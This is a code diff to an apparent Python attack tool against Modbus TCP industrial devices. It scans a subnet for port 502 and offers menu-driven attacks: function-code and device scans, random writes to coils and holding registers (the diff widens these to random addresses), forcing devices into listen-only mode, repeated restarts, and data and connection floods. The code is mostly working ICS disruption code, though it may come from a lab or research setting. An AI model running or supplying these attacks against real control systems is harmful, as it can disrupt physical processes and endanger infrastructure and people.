@@ -24,8 +24,8 @@ LOGO = r"""
 """
 
 # globals
-scanned_ips = []        # is filled with all modbus ips if the first attacks is executed
-scanned_addresses = {}  # is filled with lists of modbus addresses (key is the ip) 
+#scanned_ips = []        # is filled with all modbus ips if the first attacks is executed
+#scanned_addresses = {}  # is filled with lists of modbus addresses (key is the ip) 
 
 
 # CLASS:    CustomModbusRequest
@@ -57,9 +57,9 @@ def create_custom_request(fc):
 # FUNCTION: address_scan
 # PURPOSE:  Performs an address scan on the given network in CIDR format. The
 #           scan identifies hosts running with port 502 open, as this port is used for Modbus
-#           TCP communication.
+#           TCP communication. Returns all scanned ips in an array.
 def address_scan(ip_CIDR):
-    global scanned_ips
+    #global scanned_ips
 
     print("### ADDRESS SCAN ###")
     print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")
@@ -72,6 +72,7 @@ def address_scan(ip_CIDR):
     print(f"Command ran: {nm.command_line()}")
 
     # print scan results
+    scanned_ips = []
     for host in nm.all_hosts():
         print("--------------------------------------------")        
         print(f"Host: {host} ({nm[host].hostname()})")
@@ -89,12 +90,13 @@ def address_scan(ip_CIDR):
                     scanned_ips.append(nm[host]['addresses']['ipv4'])
 
     print("### ADDRESS SCAN FINISH ###")
+    return scanned_ips
 
 
 
 # FUNCTION: function_code_scan
 # PURPOSE:  Scans all valid function codes for a list a specified Modbus clients, checking if
-#           the function codes work.
+#           the function codes work. 
 def function_code_scan(ip_addresses):
     publicFC = {1,2,3,4,5,6,7,8,11,12,15,16,17,20,21,22,23,24,43}
     userDefFC = {65,66,67,68,69,70,71,72,100,101,102,103,104,105,106,107,108,109,110}
@@ -179,13 +181,14 @@ def device_identification_attack(ip_addresses):
 
 
 
-# Function: naive_sensor_read
-# Purpose: Scans over all registers and coils and attempts for find changing values,
-#   which can potentially expose used addresses.
+# FUNCTION: naive_sensor_read
+# PURPOSE:  Scans over all registers and coils and attempts for find changing values,
+#           which can potentially expose used addresses. Returns all scanned addresses in
+#           a dictionary (with the key being the ip)
 def naive_sensor_read(ip_addresses):
-    global scanned_addresses
     print("### NAIVE SENSOR READ ###")
 
+    scanned_addresses = {}
     for ip in ip_addresses:
         print(f"===== Performing naive sensor read on {ip} =====")
         print("Scanning for all registers (coils/di/ir/hr) for 10 seconds")
@@ -249,13 +252,13 @@ def naive_sensor_read(ip_addresses):
         print(scanned_addresses)
 
     print("### NAIVE SENSOR READ FINISH ###")
+    return scanned_addresses
 
 
 
-# Function: sporadic_sensor_measurement_injection
-# Purpose: Writes completely random values to coil/holding registers. 
-def sporadic_sensor_measurement_injection(ip_addresses):
-    global scanned_addresses
+# FUNCTION: sporadic_sensor_measurement_injection
+# PURPOSE:  Writes completely random values to coil/holding registers. 
+def sporadic_sensor_measurement_injection(ip_addresses, scanned_addresses=[]):
     print("### SPORADIC SENSOR MEASUREMENT INJECTION ###")
 
     if len(scanned_addresses) == 0:
@@ -263,37 +266,57 @@ def sporadic_sensor_measurement_injection(ip_addresses):
     
     for ip in ip_addresses:
         print(f"Injecting random data for 10 seconds into {ip}")
-        
-        co_addresses = scanned_addresses[ip]["co"] 
-        hr_addresses = scanned_addresses[ip]["hr"]
-        print(f"Affecting found addresses: coils {co_addresses}, holding register {hr_addresses}")
-
         client = ModbusTcpClient(host=ip, port=502)
 
-        # affect coils
-        for _ in range(100):
-            time.sleep(0.05)
-            coil_value = random.choice([True, False])
+        if len(scanned_addresses) == 0:
+            print("Affecting all addresses randomly")
 
-            for address in co_addresses:
-                client.write_coil(address-1, coil_value)
+            # affect coils
+            for _ in range(100):
+                time.sleep(0.05)
+                coil_value = random.choice([True, False])
 
-        # affect holding registers
-        for _ in range(100):
-            time.sleep(0.05)
-            hr_value = random.randint(0, 65535)
-            for address in hr_addresses:
-                client.write_register(address-1, hr_value)
+                address = random.randrange(0, 65535)
+                client.write_coil(address, coil_value)
+
+            # affect holding registers
+            for _ in range(100):
+                time.sleep(0.05)
+                hr_value = random.randint(0, 65535)
+
+                address = random.randrange(0, 65535)
+                client.write_register(address, hr_value)
+            pass
+        else:
+            co_addresses = scanned_addresses[ip]["co"] 
+            hr_addresses = scanned_addresses[ip]["hr"]
+            print(f"Affecting found addresses: coils {co_addresses}, holding register {hr_addresses}")
+
+            # affect coils
+            for _ in range(100):
+                time.sleep(0.05)
+                coil_value = random.choice([True, False])
+
+                for address in co_addresses:
+                    client.write_coil(address-1, coil_value)
+
+            # affect holding registers
+            for _ in range(100):
+                time.sleep(0.05)
+                hr_value = random.randint(0, 65535)
+                for address in hr_addresses:
+                    client.write_register(address-1, hr_value)
+
         
         client.close()
     print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")
 
 
 
-# Function: force_listen_mode
-# Purpose: Sends function code 0x08 with sub-function code 0x0004
-#   to force a device into Force Listen Mode. Devices that accept this
-#   function code will stop responding to Modbus requests.
+# FUNCTION: force_listen_mode
+# PURPOSE:  Sends function code 0x08 with sub-function code 0x0004
+#           to force a device into Force Listen Mode. Devices that accept this
+#           function code will stop responding to Modbus requests.
 def force_listen_mode(ip_addresses):
     print("### FORCE LISTEN MODE ###")
 
@@ -320,10 +343,10 @@ def force_listen_mode(ip_addresses):
 
 
 
-# Function: restart_communication
-# Purpose: Sends function code 0x08 with sub-function code 0x0001
-#   to restart the device. Do this to cause the device to be constantly
-#   inactive.
+# FUNCTION: restart_communication
+# PURPOSE:  Sends function code 0x08 with sub-function code 0x0001
+#           to restart the device. Do this to cause the device to be constantly
+#           inactive.
 def restart_communication(ip_addresses):
     print("### RESTART COMMUNICATION ###")
 
@@ -354,8 +377,8 @@ def restart_communication(ip_addresses):
 
 
 
-# Function: data_flood_attack
-# Purpose: Floods packets of random modbus read requests to the devices
+# FUNCTION: data_flood_attack
+# PURPOSE:  Floods packets of random modbus read requests to the devices
 def data_flood_attack(ip_addresses):
     print("### DATA FLOOD ATTACK ###")
 
@@ -395,8 +418,8 @@ def data_flood_attack(ip_addresses):
 
 
 
-# Function: connection_flood_attack
-# Purpose: Floods packets with TCP connection requests
+# FUNCTION: connection_flood_attack
+# PURPOSE:  Floods packets with TCP connection requests
 def connection_flood_attack(ip_addresses):
     print("### CONNECTION FLOOD ATTACK ###")
 
@@ -481,6 +504,8 @@ if __name__ == "__main__":
 """
 
     selection = -1
+    scanned_ips = []
+    scanned_addresses = {}
     while selection != 9:
         selection = -1
         # get user input (only as int)
@@ -496,15 +521,15 @@ if __name__ == "__main__":
 
         # perform cyber attack
         if selection == 0:
-            address_scan("192.168.0.0/24")
+            scanned_ips = address_scan("192.168.0.0/24")
         elif selection == 1:
             function_code_scan(scanned_ips)
         elif selection == 2:
             device_identification_attack(scanned_ips)
         elif selection == 3:
-            naive_sensor_read(scanned_ips)
+            scanned_addresses = naive_sensor_read(scanned_ips)
         elif selection == 4:
-            sporadic_sensor_measurement_injection(scanned_ips)
+            sporadic_sensor_measurement_injection(scanned_ips, scanned_addresses=scanned_addresses)
         #elif selection == 5:
         #    calculated_sensor_measure_injection(scanned_ips)
         #elif selection == 6:
